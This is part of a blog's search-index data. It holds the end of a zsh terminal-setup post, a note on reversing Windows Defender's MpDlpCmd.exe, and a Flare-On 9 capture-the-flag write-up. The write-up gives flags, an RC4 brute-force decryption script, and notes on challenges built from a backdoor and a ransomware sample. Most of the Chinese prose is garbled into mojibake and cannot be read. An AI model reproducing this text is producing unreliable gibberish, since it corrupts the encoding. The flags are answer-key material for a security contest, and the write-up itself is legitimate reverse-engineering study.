æ’ä»¶æ˜¯åŒæ¨£çš„åŠŸèƒ½ï¼Œæœƒè‡ªå‹•å¹«ä½ æ ¹æ“šå‰¯æª”åè§£å£“ç¸®ï¼Œå°±ä¸éœ€è¦å†å»èƒŒé‚£äº›æŒ‡ä»¤ éå®˜æ–¹çš„æ’ä»¶çš„è©±ï¼Œæˆ‘å€‘ä»¥ alias-tips é€™å€‹æ’ä»¶åšä¾‹å­ï¼Œåªè¦åœ¨ .zimrc åŠ å…¥ä¸‹é¢ä¸€è¡Œ .zimrc1zmodule djui/alias-tips ç„¶å¾Œæ‰“ zimfw installï¼Œä»–å°±æœƒå»å¹«ä½  git clone é‚£å€‹ repo ä¸‹ä¾†ï¼Œæ¥è‘—åœ¨è¼‰å…¥æ’ä»¶çš„æ™‚å€™æœƒå»æ‰¾ {init.zsh|module_name.{zsh|plugin.zsh|zsh-theme|sh}} é€™å€‹æ ¼å¼çš„æª”åï¼Œåªè¦æ‰¾å¾—åˆ°é€™æ¨£çš„æª”æ¡ˆçš„ github repo åŸºæœ¬ä¸Šéƒ½å¯ä»¥å®‰è£ Powerlevel10k powerlevel10k çœ‹åå­—å°±çŸ¥é“æ˜¯ç”¨ä¾†å¹¹æ‰ powerlevel9k çš„ï¼Œè¨˜å¾—ç•¶åˆçœ‹åˆ° powerlevel9k çš„æ™‚å€™å…©çœ¼ç™¼å…‰ï¼Œæ­¤ç”Ÿæ²’çœ‹éé€™éº¼æ¼‚äº®çš„ä¸»é¡Œï¼Œç›´åˆ°ç¾åœ¨çœ‹åˆ° powerlevel10k powerlevel9kï¼Œé‚£ powerlevel10k ç©¶ç«Ÿæ˜¯çŒ›åœ¨å“ªï¼Œå°±æˆ‘ä¾†çœ‹ï¼Œæˆ‘è¦ºå¾— powerlevel10k æœ€å¤§çš„å„ªé»åœ¨æ–¼ä»–å„ªç§€çš„å®¢è£½åŒ–ç³»çµ±ï¼Œè«‹çœ‹ä¸‹åœ– å¯ä»¥è®“ä½ ä¸€æ­¥æ­¥è¨­å®šæ¯å€‹ç´°ç¯€ï¼Œè€Œä¸”ä¸ç”¨è‡ªå·±æ‰‹å‹•å»æ”¹è¨­å®šï¼Œåªè¦è·‘ p10k configure é€™å€‹æŒ‡ä»¤å°±å¥½ï¼Œå°æ‡¶äººååˆ†çš„å‹å–„é˜¿ï¼Œè€Œä¸” powerlevel10k ç›´æ¥æ¨è–¦æˆ‘å€‘å®‰è£ MesloLGS NF å­—å‹ï¼Œè£å¥½å°±å®Œäº‹äº†ï¼Œä¸éœ€è¦åƒ powerlevel9k é‚„è¦è‡ªå·±èª¿å­—å‹å’Œå¤§å°ï¼Œå¦ä¸€å€‹å„ªé»å°±æ˜¯é€Ÿåº¦äº†ï¼Œå®˜æ–¹èªªæ˜¯æ¯” powerlevel9k å¿«ä¸Šä¸å°‘ï¼Œä½†æ˜¯å› ç‚ºæˆ‘åŒæ™‚ä¹Ÿæ›äº† zimfw æ‰€ä»¥ä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„æœ‰è®Šå¿« Nord é¡è‰²çš„é…ç½®æˆ‘ä½¿ç”¨ Nord é€™æ¬¾ï¼Œæœ‰å†°å¤©é›ªåœ°é«˜å†·çš„æ„Ÿè¦ºï¼Œæˆ‘æŠŠä»–å¥—ç”¨åˆ° kitty, vim, tmux ä¸Šï¼Œè®“æ•´å€‹ç’°å¢ƒæœ‰ä¸€è‡´çš„è‰²èª¿ï¼Œååˆ†èˆ’æœï¼Œè«‹çœ‹ä¸‹åœ–ï¼Œå®‰è£çš„éƒ¨åˆ†å¯ä»¥åˆ° å®˜æ–¹çš„ github è£¡é¢å»æ‰¾ï¼Œå„å¤§å¸¸è¦‹çš„ç·¨è¼¯å™¨å¹¾ä¹éƒ½æœ‰æ”¯æ´","link":"/2020/01/18/terminal/"},{"title":"ã€Windows Securityã€‘MpDlpCmd.exe","text":"MpDlpCmd.exe This executable is located under C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\v.vv.vvvv.v-v It seems to be related to Data Loss Prevention (DLP). There is no manual anywhere. Only a short message Usage: MpDlpCmd -&lt;Command&gt; I decided to open IDA Pro to do some reverse engineering. From the decompiled code, we can clearly see that there are three parameters. -h / -?: print usage -ShowDlpDetailsDialog -TestDlpDetailsDialog -ShowDlpDetailsDialog With -ShowDlpDetailsDialog, there will be error message MpDlpCmd: Failed with hr = 0x80004005.. Not sure what is happening. -TestDlpDetailsDialog With -TestDlpDetailsDialog, we can get below window.","link":"/2022/11/01/MpDlpCmd/en/"},{"title":"ã€Writeupsã€‘Flare-on 9","text":"01 - Flaredle 123456const CORRECT_GUESS = 57;let rightGuessString = WORDS[CORRECT_GUESS];if (guessString === rightGuessString) { let flag = rightGuessString + '@flare-on.com'; ...} flag å°±æ˜¯ WORDS[57] 02 - Pixel Poker 1234if (x == 0x52414c46 % 741 &amp;&amp; y == 0x6e4f2d45 % 641) { # print flag ...} é»é¸ (95, 313) é€™å€‹æ ¼å­å°±æœƒå™´å‡º flag å¦‚ä¸‹ 03 - Magic 8 Ball æŒ‰ LLURULDUL æ–¹å‘éµ ç„¶å¾Œåœ¨ä¸‹é¢è¼¸å…¥ gimme flag pls? å°±æœƒå™´å‡º flag å¦‚ä¸‹ 04 - darn_mice 12345for (int i = 0; i &lt; 10; i++) { void *ptr = malloc(0x1000); *ptr = payload[i] + input[i]; (void(*)())(ptr)();} æ¯å€‹ byte éƒ½æœƒè¢«ç•¶æˆ 1-byte shellcode å‘¼å«ï¼Œåªæœ‰å…¨éƒ¨éƒ½æ˜¯ 0xc3 ä¹Ÿå°±æ˜¯ ret æ‰ä¸æœƒ crash flag æ˜¯ i_w0uld_l1k3_to_RETurn_this_joke@flare-on.com 05 - T8 é€™é¡Œçµ¦äº†ä¸€éš» PE åŸ·è¡Œæª”å’Œä¸€åŒ… pcap ç¨‹å¼ä¸€é–‹å§‹æœƒæœ‰å€‹ anti-debugï¼Œåˆ¤æ–·æ™‚é–“æ˜¯æ»¿æœˆçš„æ™‚å€™æ‰èƒ½åŸ·è¡Œ ä»–æœ‰ä¸€å€‹å‡½å¼æ˜¯åœ¨è¨ˆç®—æœˆäº®çš„é€±æœŸ OwO pcap è£¡é¢æœ‰å…©å€‹ requests å…©å€‹ response ç¸½ä¹‹å‹•æ…‹è¿½ä¸€ä¸‹å¯ä»¥ç™¼ç¾ä»–è¨ˆç®— request å…§å®¹çš„é‚è¼¯ åŸºæœ¬ä¸Šä»–å°±æ˜¯ç”¨ RC4 åŠ å¯†ï¼Œä»–ç”¢çš„ key æ˜¯ FO9 åŠ ä¸Š 0 åˆ° 65535 ä¹‹é–“éš¨æ©Ÿä¸€å€‹æ•¸å­—ï¼Œæ¯”å¦‚ FO91234ï¼Œåš md5 çš„çµæœ æ‰€ä»¥çˆ†æœä¸€ä¸‹å°±å¯ä»¥è§£å‡ºå°åŒ…çš„å…§å®¹ï¼Œçˆ†æœç¨‹å¼ç¢¼å¦‚ä¸‹ï¼Œè¦æ³¨æ„ wide string çš„è½‰æ› O_O 12345678910111213141516171819202122232425262728293031import hashlibfrom base64 import *from Crypto.Cipher import ARC4def to_wide(x): return b''.join([bytes([i, 0]) for i in x])def check_wide(x): for i, j in enumerate(x): if i % 2 == 1 and j != 0: return False return Truedef gen_key(x): return to_wide(hashlib.md5(to_wide(x)).hexdigest().encode())def rc4(key, m): return ARC4.new(key).encrypt(m)enc_req = b64decode(&quot;ydN8BXq16RE=&quot;)enc_res = b64decode(&quot;TdQdBRa1nxGU06dbB27E7SQ7TJ2+cd7zstLXRQcLbmh2nTvDm1p5IfT/Cu0JxShk6tHQBRWwPlo9zA1dISfslkLgGDs41WK12ibWIflqLE4Yq3OYIEnLNjwVHrjL2U4Lu3ms+HQc4nfMWXPgcOHb4fhokk93/AJd5GTuC5z+4YsmgRh1Z90yinLBKB+fmGUyagT6gon/KHmJdvAOQ8nAnl8K/0XG+8zYQbZRwgY6tHvvpfyn9OXCyuct5/cOi8KWgALvVHQWafrp8qB/JtT+t5zmnezQlp3zPL4sj2CJfcUTK5copbZCyHexVD4jJN+LezJEtrDXP1DJNg==&quot;)for i in range(256 * 256): key = gen_key(b'FO9' + str(i).encode()) dec_req = rc4(key, enc_req) if check_wide(dec_req): dec_res = rc4(key, enc_res) breakprint(dec_req)print(dec_res) ç„¶å¾Œè§£å‡ºç¬¬ä¸€å€‹å°åŒ…çš„å…§å®¹ä¹‹å¾Œï¼Œè£¡é¢çš„å…§å®¹æ˜¯ç”¨ , åˆ†é–‹çš„å¦‚ä¸‹ 1234567891011121314\\xe5\\x07\\t\\x00\\x03\\x00\\x0f\\x00\\r\\x00%\\x00\\x03\\x00b\\x02\\x00\\xdc\\x07\\n\\x00\\x06\\x00\\r\\x00\\r\\x00%\\x00\\t\\x00*\\x03\\x00\\xe1\\x07\\x0c\\x00\\x04\\x00\\x07\\x00\\r\\x00%\\x00$\\x00\\xe5\\x00\\x00\\xe0\\x07\\x05\\x00\\x05\\x00\\x06\\x00\\r\\x00%\\x00\\x0b\\x00&amp;\\x00\\x00\\xe2\\x07\\n\\x00\\x01\\x00\\x08\\x00\\r\\x00%\\x00\\x1f\\x00E\\x03\\x00\\xe6\\x07\\x03\\x00\\x02\\x00\\x01\\x00\\r\\x00%\\x002\\x00\\xda\\x00\\x00\\xde\\x07\\x07\\x00\\x02\\x00\\x16\\x00\\r\\x00%\\x006\\x00\\xd1\\x02\\x00\\xde\\x07\\x05\\x00\\x03\\x00\\x0e\\x00\\r\\x00%\\x00\\x01\\x00\\xe8\\x00\\x00\\xda\\x07\\x04\\x00\\x01\\x00\\x05\\x00\\r\\x00%\\x00:\\x00\\x0b\\x00\\x00\\xdd\\x07\\n\\x00\\x04\\x00\\x03\\x00\\r\\x00%\\x00\\x16\\x00\\x16\\x03\\x00\\xde\\x07\\x01\\x00\\x02\\x00\\x0e\\x00\\r\\x00%\\x00\\x10\\x00\\xc9\\x00\\x00\\xdc\\x07\\x0c\\x00\\x01\\x00\\n\\x00\\r\\x00%\\x000\\x00\\x0c\\x02\\x00\\xe6\\x07\\x02\\x00\\x01\\x00\\x1c\\x00\\r\\x00%\\x00&quot;\\x00K\\x01\\x00\\xe6\\x07\\t\\x00\\x05\\x00\\t\\x00\\r\\x00%\\x00!\\x00m\\x01 æ¯è¡Œéƒ½æ˜¯ä»£è¡¨æŸå¹´æŸæœˆæŸæ—¥ï¼Œç„¶å¾Œç®—ä¸€ä¸‹æ˜¯é™°æ›†å¹¾è™Ÿï¼Œå†æŠŠé‚£å€‹æ•¸å­—å°åˆ° a-z0-9 å°±å¯ä»¥çµ„å‡º flag äº†ï¼Œå¤§æ¦‚å§ O3O? åæ­£å¾Œä¾†æˆ‘è¦ºå¾—å¥½éº»ç…©ï¼Œå°±ç›´æ¥æŠŠè§£å‡ºä¾†çš„å°åŒ…å…§å®¹å€’å›å» debuggerï¼Œflag å°±æ‰å‡ºä¾†äº† O_O flag æ˜¯ i_s33_you_m00n@flare-on.com 06 - Ã  la mode é€™é¡Œä¹çœ‹ä¹‹ä¸‹æ˜¯ .NET ç¨‹å¼ ä½†ç”¨ dnspy ç¿»äº†ä¸€ä¸‹ç™¼ç¾æ²’ä»€éº¼æ±è¥¿ åœ¨é€› PEBear çš„æ™‚å€™å°±çœ‹åˆ°äº† .NET Header è£¡é¢çš„ Flags å¯«äº† Native EntryPoint å’¦?é›£é“é€™æ˜¯éš»æ™®é€šçš„ dll ç›´æ¥æŠ„èµ·æˆ‘çš„ IDA Pro å’Œ x64dbg å’»å’»å’»ï¼Œä¸€é™£äº‚è·³ï¼Œçœ‹åˆ°äº†ä¸€äº› pipe çš„æ±è¥¿ï¼Œå†å¤šç¿»ä¸€ä¸‹å°±ç¿»åˆ°æŸå€‹åœ°æ–¹é•·å¾—å¾ˆåƒæ˜¯åœ¨ decode flag çš„åœ°æ–¹ï¼Œé‚„æœ‰å‡ºç¾ MyV0ic3 å­—ä¸² é›£é“æ˜¯è¦ create pipe ç„¶å¾Œå‚³é€™å€‹å­—ä¸²ï¼Œå¥½åƒå¾ˆéº»ç…©ï¼Œæˆ‘ç›´æ¥æ‰‹èµ·åˆ€è½æŠŠ cmp çš„å¦ä¸€å€‹è®Šæ•¸ä¸€æ¨£æ”¹æˆ MyV0ic3ï¼Œå†æŒ‰äº†å¹¾ä¸‹ step overï¼Œç™»ç™»ï¼Œflag å°±å‡ºç¾åœ¨ memory äº† flag æ˜¯ M1x3d_M0dE_4_l1f3@flare-on.com p.s. è§£é€™é¡Œçš„æ™‚å€™å‰›å¥½è¦å‡ºé–€åƒé£¯ï¼ŒåŸæœ¬æƒ³èªªåªæ˜¯å…ˆçœ‹ä¸€ä¸‹é¡Œç›®ï¼Œæ²’æƒ³åˆ° flag å°±è‡ªå·±æ‰å‡ºä¾†äº†xD 07 - anode é€™éš»ç¨‹å¼æ˜¯ç”¨ node.js å¯«çš„ï¼Œæ˜¯ç”¨ nexe é€™å€‹æ±è¥¿æ‰“åŒ…çš„ ç”¨æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹çœ‹ä¸€ä¸‹å°±æœƒç™¼ç¾æª”æ¡ˆæœ€å¾Œé¢æœ‰ js åŸå§‹ç¢¼ js åŸå§‹ç¢¼è£¡é¢æœ‰ä¸€å¤§å †çš„ switch case ä¸»è¦çš„é‚è¼¯å°±æ˜¯æŠŠä½ çš„è¼¸å…¥ -&gt; åšä¸€é€£ä¸²çš„ add, sub, xor çš„æ“ä½œ -&gt; æª¢æŸ¥è·ŸæŸå€‹å€¼æ˜¯ä¸æ˜¯ä¸€æ¨£çš„ï¼Œæ˜¯çš„è©±ä½ çš„è¼¸å…¥å°±æ˜¯ flag æˆ‘å€‘å¯ä»¥ç›´æ¥å»æ”¹æœ€å¾Œçš„ js åŸå§‹ç¢¼ï¼Œåªè¦è®“æ•´å€‹æª”æ¡ˆçš„å¤§å°ä¸è®Šå°±ä¸æœƒå™´ errorï¼Œä»–åŸ·è¡Œçš„æ™‚å€™æ‡‰è©²æ˜¯ç›´æ¥æŠ“ä¸€å€‹å›ºå®šçš„ offset? åŠ äº†ä¸€è¡Œ require(&quot;a.js&quot;)ï¼Œé€™æ¨£æˆ‘å°±å¯ä»¥ç›´æ¥è·‘æˆ‘è‡ªå·±çš„ js ç°¡å–®æ¸¬è©¦äº†ä¸€ä¸‹ï¼Œç™¼ç¾ node.js è¢«æ”¹éäº†ï¼Œrandom çš„è¼¸å‡ºä¸ randomï¼Œå…¶ä»–ä¸€äº›é‹ç®—ä¹Ÿè¢«æ”¹é æ­£å¸¸ä¾†èªªæ˜¯è¦æ¯”å°ä¸€ä¸‹åŸç‰ˆçš„ node.js å’Œé€™å€‹æ”¹éçš„ node.js å·®åœ¨å“ªè£¡ ä½†æ˜¯æˆ‘è¦ºå¾—å¥½éº»ç…©ï¼Œæˆ‘ç›´æ¥ç”¨ visual studio code çš„è¶…å¼· replace åŠŸèƒ½æŠŠé‚£ä¸€å¤§ä¸²çš„ add æ›æˆ subï¼Œsub æ›æˆ addï¼Œç„¶å¾Œç•¶åšå­—ä¸²æ¨åˆ°ä¸€å€‹é™£åˆ— æ¥è‘—æŠŠé™£åˆ—å€’éä¾†ï¼Œæ‹¿å» eval å°±å¯ä»¥ flag äº† OwO 123456789101112131415161718192021222324252627282930.../* åŸæœ¬case 1071664271: if (Math.random() &lt; 0.5) { b[17] += b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8; b[17] &amp;= 0xFF; } else { b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + Math.floor(Math.random() * 256)) &amp; 0xFF; } state = 175099911; continue;*/// è™•ç†écase 1071664271: if (Math.random() &lt; 0.5) { commands.push(`b[17] -= b[0] + b[35] + b[12] + b[42] + b[14] + b[3] + 8`); commands.push(`b[17] &amp;= 0xFF`); } else { commands.push(`b[18] ^= (b[20] + b[23] + b[6] + b[12] + b[4] + b[25] + ${Math.floor(Math.random() * 256))} &amp; 0xFF`); } state = 175099911; continue;...var b = [106, 196, 106, 178, 174, 102, 31, 91, 66, 255, 86, 196, 74, 139, 219, 166, 106, 4, 211, 68, 227, 72, 156, 38, 239, 153, 223, 225, 73, 171, 51, 4, 234, 50, 207, 82, 18, 111, 180, 212, 81, 189, 73, 76];commands.reverse().forEach(command =&gt; eval(command));console.log(b) flag æ˜¯ n0t_ju5t_A_j4vaSCriP7_ch4l1eng3@flare-on.com p.s. é›–ç„¶ flag èªª not just a javascript challengeï¼Œä½†æ˜¯æˆ‘å®Œå…¨æŠŠä»–ç•¶ä½œ javascript ä¾†è§£äº†ï¼ŒæŠ±æ­‰äº†xD 08 - backdoor é€™é¡Œè¢«å¤§å®¶èªªæ˜¯å…¨éƒ¨è£¡é¢æœ€é›£çš„ï¼Œæˆ‘è¦ºå¾—æ˜¯è »éº»ç…©çš„ï¼Œæ‰¾ä¸åˆ°åœ°æ–¹å·åƒæ­¥ï¼Œæˆ–æ˜¯å…¶å¯¦æœ‰ä½†æˆ‘ä¸çŸ¥é“xD (å¯ä»¥å·å·å‘Šè¨´æˆ‘ O_O) é€™éš»æ˜¯ .NET çš„ç¨‹å¼ï¼Œdnspy æ‰“é–‹æœƒçœ‹åˆ°ä¸€å †çš„ try except ä¸€é–‹å§‹è·‘ä¸‹å»éƒ½æœƒé€²åˆ° except è£¡é¢ å› ç‚ºä»–æ˜¯åœ¨ except è£¡é¢å»å»ºå‡ºä¸€å€‹ DynamicMethodï¼Œå†æŠŠæ­£ç¢ºçš„ IL code å¡é€²å»è·‘ ä½†å¦‚æœä½ ç›´æ¥æŠŠå‹•æ…‹è·‘çš„æ™‚å€™çœ‹åˆ°çš„é‚£æ®µ IL code æŠ“ä¸‹ä¾†å¡å›å»æª”æ¡ˆè£¡é¢ï¼Œæœƒç™¼ç¾é‚„æ˜¯éŒ¯çš„ å› ç‚ºä»–æœ‰ä¸€æ®µæ˜¯åœ¨åš dynamicILInfo.GetTokenForï¼Œæ˜¯åœ¨æŠŠå¤–é¢ä¸–ç•Œçš„ metadata token æ›æˆ dynamicILInfo ä¸–ç•Œä¸­çš„ metadata tokenï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æŠŠé‚£å€‹ IL è¤‡è£½å‡ºä¾†ï¼Œè¦è¤‡è£½å†æ—©ä¸€é»é‚„æ²’æœ‰æ›æ‰çš„ï¼Œç„¶å¾ŒæŠŠæ­£ç¢ºçš„ metadata token æ”¾ä¸Šå» é€™é‚Šæˆ‘å› ç‚ºæ²’æœ‰æ‰¾åˆ°å¥½æ–¹æ³• (å° .NET ä¸ç†Ÿ QQ)ï¼Œæ‰€ä»¥æ˜¯ç”¨ dyspy å‹•æ…‹è·‘ï¼Œæ‰‹å‹•è¤‡è£½å‡º IL code å’Œ metadata tokenï¼Œç„¶å¾Œå¯«å€‹ python script å»æ”¹åŸæœ¬çš„åŸ·è¡Œæª”ï¼Œæœ€å¾Œå¯ä»¥æ­£å¸¸çš„ decompile æ‰€æœ‰å‡½å¼ æ¥è‘—çœ‹åˆ°äº†ä¸€äº› powershell command $(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null; æ‹¿å» google äº†ä¸€ä¸‹å°±æ‰¾åˆ°äº†é€™ç¯‡ APT34 targets Jordan Government using new Saitama backdoor é•·å¾—ä¸€æ¨¡ä¸€æ¨£ï¼Œé€™é¡Œå°±æ˜¯å¾é€™éš»æƒ¡æ„ç¨‹å¼æ”¹çš„ å…¶ä¸­åœ¨è™•ç†ä¸åŒçš„ task çš„éƒ¨åˆ†æœ‰ç™¼ç¾ä¸€äº›åœ¨åšæ¯”è¼ƒå­—ä¸²çš„ç¨‹å¼ç¢¼ æ„Ÿè¦ºè·Ÿ flag æœ‰é—œï¼Œå°±ä»”ç´°çœ‹äº†ä¸€ä¸‹ï¼Œç™¼ç¾ä»–æ˜¯è¦ä¾ç…§æŸå€‹é †åºæŠŠæ¯ä¸€å€‹ task éƒ½è·‘éä¸€æ¬¡ï¼Œå°±æœƒå»å° flag ä»–å° flag çš„åœ°æ–¹æ˜¯å¾ PE çš„ 5aeb2b97 é€™å€‹ section æŠ“è³‡æ–™å‡ºä¾†ï¼Œç„¶å¾Œæ‹¿å»è§£ï¼Œä¸­é–“é‚„æœƒè·Ÿ stacktrace çš„å­—ä¸²æ”ªåœ¨ä¸€èµ·ï¼Œååˆ†çš„å™å¿ƒ å¾Œä¾†å—ä¸äº†ï¼Œæ²’æœ‰å¯ä»¥å·åƒæ­¥çš„åœ°æ–¹ï¼Œé‚„æ˜¯ä¹–ä¹–åœ°å¯«äº†ä¸€å€‹ dns server è·Ÿç¨‹å¼äº’å‹•ï¼ŒæŒ‰ç…§æ­¥é©Ÿå»ç™¼ task idï¼ŒåŸ·è¡Œå®Œä¹‹å¾Œå°±å™´å‡º flag äº† flag æ˜¯ W3_4re_Kn0wn_f0r_b31ng_Dyn4m1c@flare-on.com 09 - encryptor é€™éš»æ˜¯ä¸€å€‹ Ransomwareï¼Œæ¨™æº–çš„ç”¨ Symmetric Encryption åšåŠ å¯†ï¼Œå†ç”¨ Asymmetric Encryption åŠ å¯† Symmetric Encryption çš„ key å¾ˆå¿«å°±å¯ä»¥çœ‹å‡ºä»–æœ‰åš chacha20 ä½†æ˜¯ä¸€ç›´æ‰¾ä¸åˆ°ä»–ç”¨ä»€éº¼ Asymmetric Encryptionï¼Œä¸€ç›´åœ¨æƒ³æ˜¯ä»€éº¼è¤‡é›œçš„åŠ å¯†æ¼”ç®—æ³•ï¼Œä¸€é–‹å§‹æ‡·ç–‘æ˜¯ ECCï¼Œå¾Œä¾†åˆå†çŒœ NTRU æˆ‘çœ‹é‚£å€‹è¿´åœˆæ„Ÿè¦ºå¾ˆåƒæ˜¯åœ¨åšå¿«é€Ÿå†ªï¼Œåœ¨æƒ³æ˜¯å“ªå€‹æ¼”ç®—æ³•æœƒåšå¿«é€Ÿå†ªï¼Œä¸æœƒæ˜¯ RSA å§ä»–å¯«çš„é‚£éº¼è¤‡é›œï¼Œåˆ°åº•æ˜¯å“ªå€‹ï¼Œç­‰ç­‰é›£é“çœŸçš„æ˜¯ RSA å¾Œä¾†æ¸¬è©¦ä¸€ä¸‹ï¼Œç™¼ç¾çœŸçš„æ˜¯ RSAï¼Œå› ç‚ºä»–åœ¨åšå¤§æ•¸çš„é‹ç®—æ‰€ä»¥çœ‹èµ·ä¾†å¾ˆè¤‡é›œï¼Œé‚£äº›å‡½å¼å°±åªæ˜¯åœ¨åšåŠ æ³•ä¹˜æ³•æ¨¡é‹ç®—è€Œå·² Orz åæ­£ä»–å°±æ˜¯æŠŠæª”æ¡ˆåš chacha20 åŠ å¯†ï¼ŒåŠ å¯†ç”¨çš„ key å†ç”¨ RSA åšåŠ å¯† RSA åŠ å¯†ä¹‹å‰å…ˆç”¨ e=0x10001 å»ç®—å‡ºå°æ‡‰çš„ dï¼Œç„¶å¾ŒåŠ å¯†æ˜¯ç›´æ¥ m^d % n ç­‰æ–¼æˆ‘å€‘ç›´æ¥ç”¨ c^e % n å»è§£å¯†å°±å¥½ flag æ˜¯ R$A_$16n1n6_15_0pp0$17e_0f_3ncryp710n@flare-on.com 10 - Nur getrÃ¤umt é€™é¡Œæ˜¯ m68k çš„ç¨‹å¼ï¼Œéå¸¸å¤è€çš„æ±è¥¿ï¼Œè¦å¤è‘£ Mac é›»è…¦æ‰è·‘å¾—èµ·ä¾† ä¸éæˆ‘å€‘åªè¦ç…§è‘—æç¤ºå»ç”¨ Mini vMac å°±å¯ä»¥è·‘èµ·ä¾†äº† ç¨å¾®äº’å‹•ä¸€ä¸‹å°±å¯ä»¥ç™¼ç¾å®ƒå…¶å¯¦å°±æ˜¯åœ¨åš xor encryptionï¼Œå°±æ˜¯æœƒæŠŠä½ è¼¸å…¥çš„ key é‡è¤‡è²¼ä¸Šç›´åˆ°è·Ÿè¢«åŠ å¯†çš„å…§å®¹ç­‰é•·ï¼Œç„¶å¾Œåš xor æ‰€ä»¥é‡é»å°±æ˜¯ï¼Œè¦è¼¸å…¥ä»€éº¼ key? å·²çŸ¥æœ€å¾Œé¢ä¸€å®šæ˜¯ @flare-on.com æ‰€ä»¥å¯ä»¥å…ˆè§£å‡º key çš„æœ€å¾Œ 13 bytes æ˜¯ du etwas Zei ç„¶å¾Œæ­é…ä»–åœ¨ç¨‹å¼è£¡é¢å¡çš„ä¸€å †æç¤ºï¼Œå°±å¯ä»¥æ‰¾åˆ°é€™é¦–æ­Œ NENA | 99 Luftballons [1983] [Offizielles HD Musikvideo] google ä¸€ä¸‹ä»–çš„æ­Œè©å°±æœƒç™¼ç¾ç¬¬ä¸€å¥æ­Œè©å°±æ˜¯ key â€¦ æœ‰å¹¾å€‹ä¸æ˜¯è‹±æ–‡å­—æ¯çš„åœ¨è£¡é¢ï¼Œä¸é flag éƒ½æ˜¯è‹±æ–‡ï¼ŒçŒœä¸€ä¸‹ä¹Ÿé‚„å¥½ flag æ˜¯ Dann_singe_ich_ein_Lied_fur_dich@flare-on.com p.s. é€™é¡Œæœ€éº»ç…©çš„æ­¥é©Ÿæ˜¯æŠŠ encrypted flag è¤‡è£½å‡ºä¾†â€¦ 11 - The challenge that shall not be named. é€™é¡Œæ˜¯ç”¨ python å¯«çš„ï¼Œç”¨ pyinstaller æ‰“åŒ…æˆ exe æ‰€ä»¥èµ·æ‰‹å…ˆç”¨ pyinstxtractor è§£å‡ºåŸå§‹çš„ pyc (ç‰ˆæœ¬æ˜¯ 3.7.0) ç„¶å¾Œå†ç”¨ python-decompile3 è§£å›åŸæœ¬çš„ python source code æ¥è‘—å°±æœƒç™¼ç¾ä»–æœ‰ç”¨ pyarmor åšæ··æ·† ç›´æ¥ç”¨ python å»è·‘è§£å‡ºä¾†çš„ .py æª”æ¡ˆï¼Œæœƒç™¼ç¾å®ƒå™´äº†ä¸€å€‹éŒ¯èª¤ï¼Œè€Œä¸”æœ‰ stacktraceï¼Œä½ç½®æ˜¯åœ¨æœ¬åœ°çš„ crypt å‡½å¼åº« è£¡é¢æœ‰ç”¨åˆ° linux å¹³å°æ‰æœ‰çš„æ±è¥¿ï¼Œæœ‰é»å¤æ€ª æˆ‘å°±ç›´æ¥å»æ”¹é‚£å€‹ crypt.pyï¼ŒæŠŠ import _crypt è¨»è§£æ‰ï¼Œç„¶å¾Œå°±æœƒç™¼ç¾ä»–å»å‘¼å« crypt çš„æ™‚å€™æ‰¾ä¸åˆ° _cryptï¼Œå› ç‚ºæˆ‘å€‘æ²’æœ‰ import ä»– å¯ä»¥ç›´æ¥è®“ä»– return Noneï¼Œæ¥è‘—å°±åˆçœ‹åˆ°ä»–å»å‘¼å« ARC4ï¼Œä¸€æ¨£ç›´æ¥æ”¹ä»– 1234567def ARC4(x): print('arc4', x) class A: def encrypt(self, y): print('arc4.encrypt', y) return b'' return A() ç„¶å¾Œ flag å°±è¢«æˆ‘å€‘å°å‡ºä¾†äº†xD flag æ˜¯ Pyth0n_Prot3ction_tuRn3d_Up_t0_11@flare-on.com","link":"/2022/11/12/flare-on-9/zh-tw/"}],"tags":[{"name":"python","slug":"python","link":"/tags/python/"},{"name":"GIL","slug":"GIL","link":"/tags/GIL/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"writeups","slug":"writeups","link":"/tags/writeups/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"adb","slug":"adb","link":"/tags/adb/"},{"name":"nox","slug":"nox","link":"/tags/nox/"},{"name":"burp","slug":"burp","link":"/tags/burp/"},{"name":"drony","slug":"drony","link":"/tags/drony/"},{"name":"blockchain","slug":"blockchain","link":"/tags/blockchain/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"seo","slug":"seo","link":"/tags/seo/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"c++","slug":"c","link":"/tags/c/"},{"name":"kernel","slug":"kernel","link":"/tags/kernel/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"flow","slug":"flow","link":"/tags/flow/"},{"name":"dapper labs","slug":"dapper-labs","link":"/tags/dapper-labs/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"osint","slug":"osint","link":"/tags/osint/"},{"name":"rsa","slug":"rsa","link":"/tags/rsa/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"pyc","slug":"pyc","link":"/tags/pyc/"},{"name":"rootkit","slug":"rootkit","link":"/tags/rootkit/"},{"name":"srop","slug":"srop","link":"/tags/srop/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"tunnel","slug":"tunnel","link":"/tags/tunnel/"},{"name":"command","slug":"command","link":"/tags/command/"},{"name":"proxy","slug":"proxy","link":"/tags/proxy/"},{"name":"reverse ssh","slug":"reverse-ssh","link":"/tags/reverse-ssh/"},{"name":"zsh","slug":"zsh","link":"/tags/zsh/"},{"name":"zimfw","slug":"zimfw","link":"/tags/zimfw/"},{"name":"powerlevel9k","slug":"powerlevel9k","link":"/tags/powerlevel9k/"},{"name":"powerlevel10k","slug":"powerlevel10k","link":"/tags/powerlevel10k/"},{"name":"nord","slug":"nord","link":"/tags/nord/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"windows defender","slug":"windows-defender","link":"/tags/windows-defender/"},{"name":"flare","slug":"flare","link":"/tags/flare/"},{"name":"flare-on","slug":"flare-on","link":"/tags/flare-on/"},{"name":"reverse 